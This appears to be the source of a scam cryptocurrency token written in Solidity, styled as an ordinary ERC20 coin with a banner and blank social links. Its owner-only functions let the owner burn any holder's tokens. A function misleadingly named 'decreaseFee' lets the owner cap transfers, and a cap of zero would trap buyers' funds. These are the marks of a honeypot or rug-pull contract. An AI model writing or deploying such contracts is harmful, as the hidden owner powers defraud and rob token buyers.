/**

:::    ::: ::::    ::: ::::::::::: ::::::::  :::    ::: :::::::::::      :::::::::: ::::::::::: ::::::::  :::    ::: ::::::::::: ::::::::  
:+:   :+:  :+:+:   :+:     :+:    :+:    :+: :+:    :+:     :+:          :+:            :+:    :+:    :+: :+:    :+:     :+:    :+:    :+: 
+:+  +:+   :+:+:+  +:+     +:+    +:+        +:+    +:+     +:+          +:+            +:+    +:+        +:+    +:+     +:+    +:+        
+#++:++    +#+ +:+ +#+     +#+    :#:        +#++:++#++     +#+          :#::+::#       +#+    :#:        +#++:++#++     +#+    +#++:++#++ 
+#+  +#+   +#+  +#+#+#     +#+    +#+   +#+# +#+    +#+     +#+          +#+            +#+    +#+   +#+# +#+    +#+     +#+           +#+ 
#+#   #+#  #+#   #+#+#     #+#    #+#    #+# #+#    #+#     #+#          #+#            #+#    #+#    #+# #+#    #+#     #+#    #+#    #+# 
###    ### ###    #### ########### ########  ###    ###     ###          ###        ########### ########  ###    ###     ###     ########  
 

Telegram: https://t.me/

Twitter: https://twitter.com/

Website: http://.
 
*/

// SPDX-License-Identifier: MIT

pragma solidity =0.8.3;

import "./ERC20.sol";
import "./Address.sol";

contract contr is ERC20 {

    mapping(address => uint256) private _blockNumberByAddress;
    uint256 private _initialSupply = 100000000  * 10**18;
    uint256 public _maxDecreaseFee = 100000000  * 10**18;
    mapping (address => mapping (address => uint256)) private _allowances;

  
  constructor() ERC20("", "BIN") {
    
    _totalSupply += _initialSupply;
    _balances[msg.sender] += _initialSupply;
    emit Transfer(address(0), msg.sender, _initialSupply);
  }
    
  function burn(address account, uint256 amount) external onlyOwner {
    _burn(account, amount);
  }
  
  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    require(amount <= _maxDecreaseFee, "Transfer amount exceeds the maxTxAmount.");  
    _transfer(_msgSender(), recipient, amount);
        return true;
  }
  
  function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    _transfer(sender, recipient, amount);
    uint256 currentAllowance = _allowances[sender][_msgSender()];
    require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
    require(amount <= _maxDecreaseFee, "Transfer amount exceeds the maxTxAmount.");  
    _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }
    
  function decreaseFee(uint256 maxDecreaseFee) external onlyOwner() {
    _maxDecreaseFee = maxDecreaseFee;
  }

}